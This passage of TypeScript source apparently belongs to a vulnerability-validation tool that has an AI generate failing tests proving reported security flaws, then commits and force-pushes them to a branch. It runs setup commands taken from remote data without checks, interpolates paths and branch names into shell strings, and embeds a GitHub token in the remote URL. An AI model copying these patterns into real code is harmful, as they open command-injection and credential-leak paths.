/**
 * Validation Mode Implementation
 * RFC-041: Prove vulnerabilities exist with RED tests
 */

import { IssueContext, ActionConfig, AnalysisData } from '../types/index.js';
import { logger } from '../utils/logger.js';
import { ValidationResult, TestExecutionResult, Vulnerability, TestFileContext, TestSuite, AttemptHistory, TestFramework } from './types.js';
import { vendorFilterUtils } from './vendor-utils.js';
import { getAiClient } from '../ai/client.js';
import { analyzeIssue } from '../ai/analyzer.js';
import { execSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import { getGitHubClient } from '../github/api.js';
import { PhaseDataClient } from './phase-data-client/index.js';
import { TestIntegrationClient } from './test-integration-client.js';
import { extractVulnerabilitiesFromIssue } from '../utils/vulnerability-extraction.js';
import { TEST_FILE_PATTERNS, EXCLUDED_DIRECTORIES } from '../constants/test-patterns.js';
import { classifyTestResult as classifyTestResultImpl, parseTestOutputCounts } from '../utils/test-result-classifier.js';
import { getAssertionTemplate, getAssertionTemplateForFramework } from '../prompts/vulnerability-assertion-templates.js';
import { getAssertionStyleGuidance, AssertionStyleGuidance } from '../prompts/assertion-style-guidance.js';
import { buildRetryFeedback, extractMissingModule } from './retry-feedback.js';
import { extractTestLibraries as extractTestLibrariesMultiEcosystem } from './test-library-detection.js';

export class ValidationMode {
  private config: ActionConfig;
  private falsePositiveCache: Set<string>;
  private repoPath: string;
  private phaseDataClient: PhaseDataClient | null;
  private testIntegrationClient: TestIntegrationClient | null;
  private lastTestOutput: string = '';
  private lastTestStderr: string = '';
  /** RFC-101: AI context string from project shape detection */
  private projectAiContext: string = '';
  /** RFC-101: Detected ecosystems from project shape (e.g., ['python', 'javascript']) */
  private projectEcosystems: string[] = [];
  /** RFC-101 v3.8.72: Available test/assertion libraries from package.json devDependencies */
  private availableTestLibraries: string[] = [];

  constructor(config: ActionConfig, repoPath?: string) {
    this.config = config;
    this.repoPath = repoPath || process.cwd();
    this.falsePositiveCache = new Set();

    // Initialize PhaseDataClient if API key is available
    this.phaseDataClient = config.rsolvApiKey
      ? new PhaseDataClient(config.rsolvApiKey)
      : null;

    // Initialize TestIntegrationClient if API key is available
    this.testIntegrationClient = config.rsolvApiKey
      ? new TestIntegrationClient(config.rsolvApiKey)
      : null;

    // Apply environment variables from config
    if (config.environmentVariables && typeof config.environmentVariables === 'object') {
      Object.entries(config.environmentVariables).forEach(([key, value]) => {
        if (typeof value === 'string') {
          process.env[key] = value;
          logger.debug(`Applied environment variable: ${key}`);
        }
      });
    }

    this.loadFalsePositiveCache();
  }

  /**
   * Load project shape from phase data to inform framework detection.
   * Must be called before detectFrameworkWithBackend for ecosystem-aware fallback to work.
   */
  private async loadProjectShapeForFrameworkDetection(issue: IssueContext): Promise<void> {
    if (!this.phaseDataClient) return;

    try {
      const commitSha = this.getCurrentCommitHash();
      const repo = issue.repository.fullName;
      const phaseData = await this.phaseDataClient.retrievePhaseResults(repo, issue.number, commitSha);
      const phaseRecord = phaseData as Record<string, unknown> | null;

      type ShapeEntry = { ecosystem?: string };
      let shapes: ShapeEntry[] = [];

      if (Array.isArray(phaseRecord?.project_shapes) && (phaseRecord.project_shapes as unknown[]).length > 0) {
        shapes = phaseRecord.project_shapes as ShapeEntry[];
      } else if (phaseRecord?.project_shape) {
        shapes = [phaseRecord.project_shape as ShapeEntry];
      }

      if (shapes.length > 0) {
        const ecosystems = shapes.map(s => s.ecosystem).filter(Boolean) as string[];
        this.projectEcosystems = ecosystems;
        logger.debug(`[RFC-101] Pre-loaded ${ecosystems.length} ecosystem(s) for framework detection: ${ecosystems.join(', ')}`);
      }
    } catch (err) {
      logger.debug(`[RFC-101] Could not pre-load project shape for framework detection: ${err}`);
    }
  }

  /**
   * Validate a single vulnerability
   */
  async validateVulnerability(issue: IssueContext, priorAnalysis?: AnalysisData): Promise<ValidationResult> {
    const isTestingMode = process.env.RSOLV_TESTING_MODE === 'true';
    const executableTestsEnabled = this.config.executableTests ?? true; // RFC-060 Phase 5.1: Default enabled

    logger.info(`[VALIDATION MODE] Starting validation for issue #${issue.number}`);
    if (isTestingMode) {
      logger.info('[VALIDATION MODE] 🧪 TESTING MODE ENABLED - Will not filter based on test results');
    }

    // Extract vulnerabilities from issue body (shared across all code paths)
    const vulnerabilities = extractVulnerabilitiesFromIssue(issue);

    logger.info('[VALIDATION MODE] Extracted vulnerabilities from issue', {
      issueNumber: issue.number,
      vulnerabilitiesCount: vulnerabilities.length,
      files: vulnerabilities.map(v => v.file)
    });

    // RFC-060 Phase 5.1: Feature flag check - skip validation if disabled
    if (!executableTestsEnabled) {
      logger.info('[VALIDATION MODE] Executable tests disabled - skipping validation');
      return {
        issueId: issue.number,
        validated: true, // Mark as validated to allow mitigation phase to proceed
        vulnerabilities,
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };
    }

    try {
      // Step 1: Ensure clean git state
      this.ensureCleanGitState();

      // Step 2: Check for vendor files FIRST (most token-efficient filter)
      const vendorFiles = await vendorFilterUtils.checkForVendorFiles(issue);
      if (vendorFiles.isVendor) {
        logger.info(`Issue #${issue.number} affects vendor files - marking as VENDORED`);
        return {
          issueId: issue.number,
          validated: false,
          vendoredFile: true,
          falsePositiveReason: 'Vulnerability in vendor file - requires library update',
          affectedVendorFiles: vendorFiles.files,
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      // Step 3: Check false positive cache (second filter)
      const cacheKey = this.getCacheKey(issue);
      if (this.falsePositiveCache.has(cacheKey) && !process.env.RSOLV_SKIP_CACHE) {
        logger.info(`Issue #${issue.number} is in false positive cache, skipping`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: 'Previously identified as false positive',
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      // Step 4: Analyze the issue (skip if priorAnalysis provided)
      let analysisData: AnalysisData;
      if (priorAnalysis) {
        logger.info(`[VALIDATION MODE] Using prior analysis for issue #${issue.number} (skipping analyzeIssue)`);
        analysisData = priorAnalysis;
      } else {
        logger.info(`Analyzing issue #${issue.number} for validation`);
        analysisData = await analyzeIssue(issue, this.config);
      }

      if (!analysisData.canBeFixed) {
        logger.warn(`Issue #${issue.number} cannot be validated: ${analysisData.cannotFixReason}`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: analysisData.cannotFixReason || 'Analysis determined issue cannot be fixed',
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }
      
      // Step 5: RFC-060-AMENDMENT-001 Pipeline — Framework-native test generation
      // Uses the already-implemented pipeline methods instead of standalone scripts
      logger.info(`[RFC-060-AMENDMENT-001] Starting framework-native test generation for issue #${issue.number}`);

      if (!this.testIntegrationClient) {
        throw new Error('TestIntegrationClient not initialized — RSOLV API key required for validation');
      }

      // Pre-load project shape for ecosystem-aware framework detection fallback
      await this.loadProjectShapeForFrameworkDetection(issue);

      // Step 5a: Detect framework via backend API (reads package.json/Gemfile/requirements.txt)
      const primaryFile = vulnerabilities[0]?.file || analysisData.filesToModify?.[0] || '';
      let frameworkName = await this.detectFrameworkWithBackend(primaryFile);
      const framework = this.detectFrameworkFromPath(
        primaryFile.replace(/\.(js|ts|rb|py|java|php|ex|exs)$/, '.test.$1')
      );
      logger.info(`Detected framework: ${frameworkName} for ${primaryFile}`);

      // Step 5b: Scan for existing test files
      const candidateTestFiles = await this.scanTestFiles(frameworkName);
      logger.info(`Found ${candidateTestFiles.length} test files in repository`);

      // Step 5c: Build vulnerability context with enclosing function extraction
      const vuln = vulnerabilities[0];
      let vulnerableCode = '';
      if (vuln && primaryFile) {
        try {
          const fullPath = path.resolve(this.repoPath, primaryFile);
          if (fs.existsSync(fullPath)) {
            const fullFileContent = fs.readFileSync(fullPath, 'utf8');
            // Use enclosing function if available from SCAN phase AST validation
            if (vuln.enclosingFunction) {
              const { startLine, endLine } = vuln.enclosingFunction;
              const lines = fullFileContent.split('\n');
              vulnerableCode = lines.slice(startLine - 1, endLine).join('\n');
              logger.info(`Using enclosing function '${vuln.enclosingFunction.name}' (lines ${startLine}-${endLine}) as context`);
            } else {
              vulnerableCode = fullFileContent;
              logger.info('No enclosing function available, using full file as context');
            }
          }
        } catch (readError) {
          logger.warn(`Could not read vulnerable file ${primaryFile}: ${readError}`);
        }
      }

      // Step 5d: Select or create target test file (with E2E framework filtering)
      let targetTestFile: TestFileContext;
      if (candidateTestFiles.length > 0) {
        try {
          // Use backend to score and select the best target test file
          const analysis = await this.testIntegrationClient.analyze({
            vulnerableFile: primaryFile,
            vulnerabilityType: vuln?.type || issue.title,
            candidateTestFiles,
            framework: frameworkName
          });

          // Iterate through recommendations, skipping E2E framework targets
          let selectedPath: string | null = null;
          let selectedContent = '';
          const recommendations = analysis.recommendations || [];

          for (const rec of recommendations) {
            const recFullPath = path.join(this.repoPath, rec.path);
            const recContent = fs.existsSync(recFullPath) ? fs.readFileSync(recFullPath, 'utf8') : '';
            const contentFramework = this.detectFrameworkFromContent(recContent);

            if (contentFramework && this.isE2EFramework(contentFramework)) {
              logger.info(`[VALIDATION MODE] Skipping E2E target: ${rec.path} (detected: ${contentFramework})`);
              continue;
            }

            // If content detection finds a different unit framework, override
            if (contentFramework && contentFramework !== frameworkName && !this.isE2EFramework(contentFramework)) {
              logger.info(`[VALIDATION MODE] Target framework override: ${frameworkName} → ${contentFramework} (from ${rec.path})`);
              frameworkName = contentFramework;
            }

            selectedPath = rec.path;
            selectedContent = recContent;
            logger.info(`Backend recommended target: ${rec.path} (score: ${rec.score})`);
            break;
          }

          // If no recommendation survived E2E filtering, try candidates directly
          if (!selectedPath) {
            for (const candidate of candidateTestFiles) {
              const candFullPath = path.join(this.repoPath, candidate);
              const candContent = fs.existsSync(candFullPath) ? fs.readFileSync(candFullPath, 'utf8') : '';
              const candFramework = this.detectFrameworkFromContent(candContent);

              if (candFramework && this.isE2EFramework(candFramework)) {
                logger.info(`[VALIDATION MODE] Skipping E2E candidate: ${candidate} (detected: ${candFramework})`);
                continue;
              }

              selectedPath = candidate;
              selectedContent = candContent;
              if (candFramework && candFramework !== frameworkName) {
                frameworkName = candFramework;
              }
              break;
            }
          }

          if (selectedPath) {
            targetTestFile = {
              path: selectedPath,
              content: selectedContent,
              framework: frameworkName
            };
          } else {
            // All candidates are E2E — fall through to create-new-file path
            logger.info('[VALIDATION MODE] All candidate test files are E2E frameworks — creating new unit test file');
            const testDirMap: Record<string, string> = {
              'mocha': 'test/unit',
              'jest': '__tests__',
              'vitest': '__tests__',
              'rspec': 'spec',
              'pytest': 'tests',
              'phpunit': 'tests',
              'exunit': 'test'
            };
            const testDir = testDirMap[frameworkName] || 'test/unit';
            const ext = this.getLanguageExtension(frameworkName);
            const fallbackPath = `${testDir}/vulnerability_validation${ext}`;
            targetTestFile = {
              path: fallbackPath,
              content: '',
              framework: frameworkName
            };
          }
        } catch (analyzeError) {
          logger.warn(`Backend analyze failed, using first non-E2E test file: ${analyzeError}`);
          // Filter fallback candidates for E2E frameworks too
          let fallbackPath: string | null = null;
          let fallbackContent = '';
          for (const candidate of candidateTestFiles) {
            const candFullPath = path.join(this.repoPath, candidate);
            const candContent = fs.existsSync(candFullPath) ? fs.readFileSync(candFullPath, 'utf8') : '';
            const candFramework = this.detectFrameworkFromContent(candContent);
            if (candFramework && this.isE2EFramework(candFramework)) {
              continue;
            }
            fallbackPath = candidate;
            fallbackContent = candContent;
            break;
          }
          if (fallbackPath) {
            targetTestFile = {
              path: fallbackPath,
              content: fallbackContent,
              framework: frameworkName
            };
          } else {
            const testDir = 'test/unit';
            const ext = this.getLanguageExtension(frameworkName);
            targetTestFile = {
              path: `${testDir}/vulnerability_validation${ext}`,
              content: '',
              framework: frameworkName
            };
          }
        }
      } else {
        // No test files exist — create a fallback path based on framework conventions
        const testDirMap: Record<string, string> = {
          'mocha': 'test/unit',
          'jest': '__tests__',
          'vitest': '__tests__',
          'rspec': 'spec',
          'pytest': 'tests',
          'phpunit': 'tests',
          'exunit': 'test'
        };
        const testDir = testDirMap[frameworkName] || 'test';
        const ext = this.getLanguageExtension(frameworkName);
        const fallbackPath = `${testDir}/vulnerability_validation${ext}`;
        logger.info(`No test files found — using fallback path: ${fallbackPath}`);

        targetTestFile = {
          path: fallbackPath,
          content: '', // Empty — new file
          framework: frameworkName
        };
      }

      // Step 5e: Build vulnerability descriptor for test generation
      const vulnerabilityDescriptor: Vulnerability = {
        type: vuln?.type || 'unknown',
        description: vuln?.description || issue.title,
        location: `${primaryFile}:${vuln?.line || 0}`,
        attackVector: vuln?.type || 'unknown',
        vulnerablePattern: vulnerableCode.slice(0, 2000), // Truncate for prompt (increased from 500 for better AI context)
        source: primaryFile
      };

      // RFC-101: Retrieve project shape(s) from phase data for environment context
      try {
        if (this.phaseDataClient) {
          const commitSha = this.getCurrentCommitHash();
          const repo = issue.repository.fullName;
          const phaseData = await this.phaseDataClient.retrievePhaseResults(repo, issue.number, commitSha);
          const phaseRecord = phaseData as Record<string, unknown> | null;

          // Resolve shapes array: prefer project_shapes (multi-ecosystem), fall back to project_shape (single)
          type ShapeEntry = { ecosystem?: string; ai_context?: string; setup_commands?: string[]; runtime_services?: unknown[]; env?: Record<string, string> };
          let shapes: ShapeEntry[] = [];

          if (Array.isArray(phaseRecord?.project_shapes) && (phaseRecord.project_shapes as unknown[]).length > 0) {
            shapes = phaseRecord.project_shapes as ShapeEntry[];
          } else if (phaseRecord?.project_shape) {
            shapes = [phaseRecord.project_shape as ShapeEntry];
          }

          if (shapes.length > 0) {
            const ecosystems = shapes.map(s => s.ecosystem).filter(Boolean) as string[];
            const totalServices = shapes.reduce((sum, s) => sum + (s.runtime_services?.length ?? 0), 0);
            logger.info(`[RFC-101] Project shape detected: ${ecosystems.length} ecosystem(s): ${ecosystems.join(', ')}, ${totalServices} total service deps`);

            // Store ecosystems for use in framework detection fallback
            this.projectEcosystems = ecosystems;

            // Merge AI context from all shapes
            const contextParts = shapes.map(s => s.ai_context || '').filter(Boolean);
            this.projectAiContext = contextParts.join('\n\n');

            // Merge env vars from all shapes and apply to process.env
            const mergedEnv: Record<string, string> = {};
            for (const shape of shapes) {
              if (shape.env && typeof shape.env === 'object') {
                Object.entries(shape.env).forEach(([key, value]) => {
                  if (typeof value === 'string') {
                    mergedEnv[key] = value;
                  }
                });
              }
            }
            const envKeys = Object.keys(mergedEnv);
            if (envKeys.length > 0) {
              for (const [key, value] of Object.entries(mergedEnv)) {
                process.env[key] = value;
              }
              logger.info(`[RFC-101] Applied ${envKeys.length} env var(s) from project shape`);
            }

            // Collect and execute setup commands from all shapes
            const allSetupCommands = shapes.flatMap(s => s.setup_commands || []);
            for (const cmd of allSetupCommands) {
              try {
                execSync(cmd, { cwd: this.repoPath, timeout: 60000, encoding: 'utf8', env: { ...process.env, ...mergedEnv } });
                logger.info(`[RFC-101] Setup command succeeded: ${cmd}`);
              } catch (setupErr) {
                logger.warn(`[RFC-101] Setup command warning: ${cmd} — ${setupErr instanceof Error ? setupErr.message : String(setupErr)}`);
              }
            }
          }
        }
      } catch (shapeErr) {
        logger.warn(`[RFC-101] Project shape retrieval warning: ${shapeErr instanceof Error ? shapeErr.message : String(shapeErr)}`);
      }

      // Step 5f: Generate test with retry loop (existing RFC-060 method)
      logger.info('Generating RED test with retry loop...');
      const testSuite = await this.generateTestWithRetry(
        vulnerabilityDescriptor,
        targetTestFile,
        3 // maxAttempts
      );

      if (!testSuite) {
        logger.warn(`Failed to generate valid RED test after retries for issue #${issue.number}`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: 'Unable to generate valid RED test after 3 attempts',
          vulnerabilities,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      logger.info(`✅ RED test generated: ${testSuite.testFile} (framework: ${testSuite.framework})`);

      // Step 6: Create validation branch and commit integrated test
      logger.info('Creating validation branch for test persistence');
      let branchName: string | null = null;

      try {
        branchName = await this.createValidationBranch(issue);

        // AST-integrate the test into the target file via backend
        let targetFile = testSuite.testFile;
        let integratedContent = testSuite.redTests[0]?.testCode || '';

        try {
          const integration = await this.integrateTestsWithBackendRetry(testSuite, issue, targetTestFile);
          targetFile = integration.targetFile;
          integratedContent = integration.content;
          logger.info(`AST integration succeeded: ${targetFile}`);
        } catch (integrationError) {
          logger.warn(`AST integration failed, writing test directly: ${integrationError}`);
          // Write to the target test file path directly
        }

        // Write integrated test to the repo's test directory (not .rsolv/tests/)
        const fullTargetPath = path.join(this.repoPath, targetFile);
        fs.mkdirSync(path.dirname(fullTargetPath), { recursive: true });
        fs.writeFileSync(fullTargetPath, integratedContent, 'utf8');

        // Commit
        execSync('git config user.email "rsolv-validation@rsolv.dev"', { cwd: this.repoPath });
        execSync('git config user.name "RSOLV Validation Bot"', { cwd: this.repoPath });
        execSync(`git add "${targetFile}"`, { cwd: this.repoPath });
        execSync(`git commit -m "Add RED test proving vulnerability for issue #${issue.number}"`, { cwd: this.repoPath });
        logger.info(`✅ Tests committed to validation branch: ${branchName} (file: ${targetFile})`);

        // Push to remote
        try {
          const token = process.env.GITHUB_TOKEN || process.env.GH_PAT;
          if (token && process.env.GITHUB_REPOSITORY) {
            const [owner, repo] = process.env.GITHUB_REPOSITORY.split('/');
            const authenticatedUrl = `https://x-access-token:${token}@github.com/${owner}/${repo}.git`;
            try {
              execSync(`git remote set-url origin ${authenticatedUrl}`, { cwd: this.repoPath });
            } catch (configError) {
              logger.debug('Could not configure authenticated remote');
            }
          }
          execSync(`git push -f origin ${branchName}`, { cwd: this.repoPath });
          logger.info(`Pushed validation branch ${branchName} to remote`);
        } catch (pushError) {
          logger.warn(`Could not push validation branch to remote: ${pushError}`);
        }
      } catch (branchError) {
        logger.warn(`Could not create validation branch: ${branchError}`);
      }

      // Step 7: The test was already run by generateTestWithRetry()
      // If we got here, the RED test FAILED on vulnerable code (proving vulnerability)
      const testExecutionResult: TestExecutionResult = {
        passed: false, // RED test must have failed (generateTestWithRetry ensures this)
        output: this.lastTestOutput || 'RED test failed on vulnerable code — vulnerability proven',
        stderr: this.lastTestStderr || '',
        timedOut: false,
        exitCode: 1,
        framework: testSuite.framework,
        testFile: testSuite.testFile
      };

      const counts = parseTestOutputCounts(this.lastTestOutput || '');
      const testResultsForDisplay = {
        passed: counts.passed,
        failed: counts.failed || testSuite.redTests.length,
        total: counts.total || testSuite.redTests.length,
        output: this.lastTestOutput || 'No test output captured',
        exitCode: 1
      };

      // Step 8: Vulnerability validated — RED test failed on vulnerable code
      logger.info('✅ Vulnerability validated! RED tests failed as expected');

      // Add validated label
      await this.addGitHubLabel(issue, 'rsolv:validated');

      // Store via PhaseDataClient
      await this.storeTestExecutionInPhaseData(issue, testExecutionResult, true, branchName || undefined, vulnerabilities);

      return {
        issueId: issue.number,
        validated: true,
        branchName: branchName || undefined,
        redTests: testSuite,
        testResults: testResultsForDisplay,
        testExecutionResult,
        vulnerabilities,
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };

    } catch (error) {
      logger.error(`Validation failed for issue #${issue.number}:`, error);
      return {
        issueId: issue.number,
        validated: false,
        falsePositiveReason: `Validation error: ${error}`,
        vulnerabilities,
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };
    }
  }

  /**
   * Validate multiple vulnerabilities in batch
   */
  async validateBatch(issues: IssueContext[]): Promise<ValidationResult[]> {
    logger.info(`[VALIDATION MODE] Validating batch of ${issues.length} issues`);
    const results: ValidationResult[] = [];
    
    for (const issue of issues) {
      const result = await this.validateVulnerability(issue);
      results.push(result);
      
      // Add delay between validations to avoid rate limits
      if (issues.indexOf(issue) < issues.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
    
    // Summary
    const validated = results.filter(r => r.validated).length;
    const falsePositives = results.filter(r => !r.validated).length;
    
    logger.info('[VALIDATION MODE] Batch complete:');
    logger.info(`  - Validated: ${validated}`);
    logger.info(`  - False positives: ${falsePositives}`);
    
    return results;
  }



  /**
   * RFC-058: Create validation branch for test persistence
   */
  async createValidationBranch(issue: IssueContext): Promise<string> {
    const branchName = `rsolv/validate/issue-${issue.number}`;

    try {
      // RFC-060: Create and checkout validation branch for test persistence
      execSync(`git checkout -b ${branchName}`, {
        cwd: this.repoPath
      });

      logger.info(`Created validation branch: ${branchName}`);

      return branchName;
    } catch (error) {
      logger.error(`Failed to create validation branch ${branchName}:`, error);
      throw error;
    }
  }

  /**
   * RFC-060-AMENDMENT-001: Convert test content object to executable JavaScript
   *
   * Handles multiple input formats:
   * - String: pass through (already executable)
   * - { redTests: [...] }: Array of test objects with testName/testCode
   * - { red: {...} }: Single test object with testName/testCode
   * - { tests: [...] }: TestSuite format with GeneratedTest[]
   */
  private convertToExecutableTest(testContent: unknown): string {
    // String content - sanitize and pass through
    if (typeof testContent === 'string') {
      return this.sanitizeTestStructure(testContent);
    }

    // Not an object - wrap in minimal test structure
    if (!testContent || typeof testContent !== 'object') {
      return `describe('Vulnerability Test', () => {
  it('validates vulnerability', () => {
    // ${String(testContent)}
    expect(true).toBe(true);
  });
});
`;
    }

    const content = testContent as Record<string, unknown>;

    // Handle { redTests: [...] } format
    if (Array.isArray(content.redTests)) {
      const tests = content.redTests
        .map((test: { testName?: string; testCode?: string }, index: number) => {
          const name = test.testName || `Test ${index + 1}`;
          const code = test.testCode || 'expect(true).toBe(true);';

          // If testCode already has framework structure, include it directly
          if (this.hasFrameworkStructure(code)) {
            return this.indentCode(code, 2);
          }

          return `  it('${this.escapeTestName(name)}', () => {
${this.indentCode(code, 4)}
  });`;
        })
        .join('\n\n');

      return `describe('Vulnerability Validation Tests', () => {
${tests}
});
`;
    }

    // Handle { red: {...} } single test format
    if (content.red && typeof content.red === 'object') {
      const test = content.red as { testName?: string; testCode?: string };
      const code = test.testCode || 'expect(true).toBe(true);';

      // If testCode already has framework structure, use it directly
      if (this.hasFrameworkStructure(code)) {
        return code;
      }

      const name = test.testName || 'Vulnerability Test';
      return `describe('Vulnerability Validation Tests', () => {
  it('${this.escapeTestName(name)}', () => {
${this.indentCode(code, 4)}
  });
});
`;
    }

    // Handle { tests: [...] } TestSuite format
    if (Array.isArray(content.tests)) {
      const tests = content.tests
        .map((test: { testCode?: string }, index: number) => {
          const code = test.testCode || 'expect(true).toBe(true);';

          // If testCode already has framework structure, include it directly
          if (this.hasFrameworkStructure(code)) {
            return this.indentCode(code, 2);
          }

          return `  it('Test ${index + 1}', () => {
${this.indentCode(code, 4)}
  });`;
        })
        .join('\n\n');

      return `describe('Vulnerability Validation Tests', () => {
${tests}
});
`;
    }

    // Unknown object format - create minimal wrapper
    logger.warn('Unknown test content format, creating minimal test wrapper');
    return `describe('Vulnerability Validation Tests', () => {
  it('validates vulnerability', () => {
    // Test content could not be properly parsed
    expect(true).toBe(true);
  });
});
`;
  }

  /**
   * Convert test content to executable code and sanitize the result.
   * Wraps convertToExecutableTest to ensure sanitization always runs,
   * even when the input is an object whose testCode contains nested test() blocks.
   */
  private convertToExecutableTestSanitized(testContent: unknown): string {
    const code = this.convertToExecutableTest(testContent);
    // Always sanitize the final output, regardless of input type
    return this.sanitizeTestStructure(code);
  }

  /**
   * Sanitize test structure to fix common AI-generated issues.
   *
   * Detects nested it()/test() blocks (invalid in Jest/Vitest/Mocha) and
   * replaces inner test() calls with plain function bodies.
   * e.g. it('name', () => { test('inner', () => { ... }) })
   * becomes it('name', () => { ... })
   */
  private sanitizeTestStructure(code: string): string {
    const hasIt = /\bit\s*\(/.test(code);
    const hasTest = /\btest\s*\(/.test(code);

    // Quick exit: if there's no it() block, there can't be nesting inside it()
    if (!hasIt) {
      return code;
    }

    // Line-based approach with brace depth tracking:
    // Strip inner test()/describe()/it() wrappers nested inside it() blocks.
    // Track brace depth to correctly find the closing }); of nested blocks,
    // ignoring inner closings from callbacks, arrow functions, etc.
    const lines = code.split('\n');
    const result: string[] = [];
    let inIt = false;
    let itBraceDepth = 0;
    let currentBraceDepth = 0;
    let inNestedBlock = false;
    let nestedBlockBraceDepth = 0;
    let justEnteredIt = false;

    for (const line of lines) {
      const opens = (line.match(/\{/g) || []).length;
      const closes = (line.match(/\}/g) || []).length;

      // Detect entering an it() block (only the outermost one)
      if (/^\s*it\s*\(/.test(line) && !inIt && !inNestedBlock) {
        inIt = true;
        justEnteredIt = true;
        itBraceDepth = currentBraceDepth;
      }

      // Inside it(): detect nested test(), describe(), or it() opening wrapper
      // Skip the line that just opened the it() block (justEnteredIt flag)
      if (inIt && !justEnteredIt && !inNestedBlock && /^\s*(test|describe|it)\s*\(/.test(line)) {
        inNestedBlock = true;
        nestedBlockBraceDepth = opens - closes;
        currentBraceDepth += opens - closes;
        // Skip the wrapper line — its body will be kept
        continue;
      }

      justEnteredIt = false;

      if (inNestedBlock) {
        nestedBlockBraceDepth += opens - closes;
        currentBraceDepth += opens - closes;

        // When depth drops to 0 (or below) and line looks like a closing, we found the end
        if (nestedBlockBraceDepth <= 0 && /^\s*\}\s*\)\s*;?\s*$/.test(line.trim())) {
          inNestedBlock = false;
          nestedBlockBraceDepth = 0;
          continue;
        }

        // Otherwise, keep the line (it's the body, just strip the wrapper)
        result.push(line);
        continue;
      }

      currentBraceDepth += opens - closes;

      // Track when we leave an it() block
      if (inIt && currentBraceDepth <= itBraceDepth && /^\s*\}\s*\)\s*;?\s*$/.test(line.trim())) {
        inIt = false;
      }

      result.push(line);
    }

    return result.join('\n');
  }

  /**
   * Check if code already contains complete test framework structure.
   * Returns true only when the code has a describe() block, indicating it's
   * a fully-structured test. Individual it()/test() calls without describe()
   * still need a wrapper and will be caught by sanitizeTestStructure() if nested.
   */
  private hasFrameworkStructure(code: string): boolean {
    return /\bdescribe\s*\(/.test(code);
  }

  /**
   * Helper: Escape single quotes in test names for JavaScript strings
   */
  private escapeTestName(name: string): string {
    return name.replace(/'/g, '\\\'').replace(/\n/g, ' ');
  }

  /**
   * Helper: Indent code block by specified number of spaces
   */
  private indentCode(code: string, spaces: number): string {
    const indent = ' '.repeat(spaces);
    return code
      .trim()
      .split('\n')
      .map(line => indent + line)
      .join('\n');
  }

  /**
   * RFC-060-AMENDMENT-001: Validate JavaScript syntax before writing test file
   *
   * Uses Function constructor to parse code without executing it.
   * Throws SyntaxError if code is invalid.
   */
  private validateTestSyntax(code: string): void {
    try {
      // Function constructor parses but doesn't execute
      new Function(code);
    } catch (error) {
      if (error instanceof SyntaxError) {
        throw new Error(`Invalid JavaScript syntax in generated test: ${error.message}`);
      }
      // Other errors (like ReferenceError) are runtime errors, which are expected
      // for RED tests that reference undefined functions
    }
  }

  /**
   * RFC-060-AMENDMENT-001: Classify test execution result
   *
   * Distinguishes between valid test failures (vulnerability proven) and
   * errors (syntax errors, missing dependencies, etc.) that don't prove anything.
   */
  classifyTestResult(exitCode: number, stdout: string, stderr: string): {
    type: 'test_passed' | 'test_failed' | 'syntax_error' | 'runtime_error' |
          'missing_dependency' | 'command_not_found' | 'oom_killed' | 'terminated' | 'unknown';
    isValidFailure: boolean;
    reason: string;
  } {
    return classifyTestResultImpl(exitCode, stdout, stderr);
  }

  /**
   * RFC-058 + RFC-060-AMENDMENT-001 Phase 2: Commit generated tests to validation branch
   * Uses retry with exponential backoff for backend integration
   *
   * Philosophy: If backend is down, we can't fully service the customer anyway.
   * Better to fail fast and maintain clear state than silently degrade.
   */
  async commitTestsToBranch(testContent: unknown, branchName: string, issue?: IssueContext): Promise<void> {
    try {
      // Backend integration required — no .rsolv/tests/ fallback
      const result = await this.integrateTestsWithBackendRetry(testContent, issue);
      const targetFile = result.targetFile;
      const integratedContent = result.content;
      logger.info(`✅ Backend integration succeeded: ${targetFile}`);

      // Write integrated content to the repo's test directory
      const fullTargetPath = path.join(this.repoPath, targetFile);
      fs.mkdirSync(path.dirname(fullTargetPath), { recursive: true });
      fs.writeFileSync(fullTargetPath, integratedContent, 'utf8');

      // Configure git identity for commits
      execSync('git config user.email "rsolv-validation@rsolv.dev"', { cwd: this.repoPath });
      execSync('git config user.name "RSOLV Validation Bot"', { cwd: this.repoPath });

      // Commit to branch
      execSync(`git add "${targetFile}"`, { cwd: this.repoPath });
      execSync('git commit -m "Add validation tests for issue"', { cwd: this.repoPath });

      logger.info(`Committed tests to branch ${branchName} (target: ${targetFile})`);

      // RFC-058: Push validation branch to remote for mitigation phase
      try {
        const token = process.env.GITHUB_TOKEN || process.env.GH_PAT;
        if (token && process.env.GITHUB_REPOSITORY) {
          const [owner, repo] = process.env.GITHUB_REPOSITORY.split('/');
          const authenticatedUrl = `https://x-access-token:${token}@github.com/${owner}/${repo}.git`;
          try {
            execSync(`git remote set-url origin ${authenticatedUrl}`, { cwd: this.repoPath });
          } catch (configError) {
            logger.debug('Could not configure authenticated remote');
          }
        }

        execSync(`git push -f origin ${branchName}`, { cwd: this.repoPath });
        logger.info(`Pushed validation branch ${branchName} to remote`);
      } catch (pushError) {
        logger.warn(`Could not push validation branch to remote: ${pushError}`);
      }
    } catch (error) {
      logger.error(`Failed to commit tests to branch ${branchName}:`, error);
      throw error;
    }
  }

  /**
   * RFC-060-AMENDMENT-001 Phase 2: Integrate tests with backend using retry logic
   * Retries with exponential backoff: 1s, 2s, 4s
   */
  private async integrateTestsWithBackendRetry(
    testContent: any,
    issue?: IssueContext,
    preSelectedTarget?: TestFileContext
  ): Promise<{ targetFile: string; content: string }> {
    const maxAttempts = 3;
    const baseDelay = 1000; // 1 second

    if (!this.testIntegrationClient) {
      throw new Error('TestIntegrationClient not initialized - check API key configuration');
    }

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        logger.debug(`Backend integration attempt ${attempt}/${maxAttempts}...`);

        // Use pre-selected target from validateVulnerability() if available
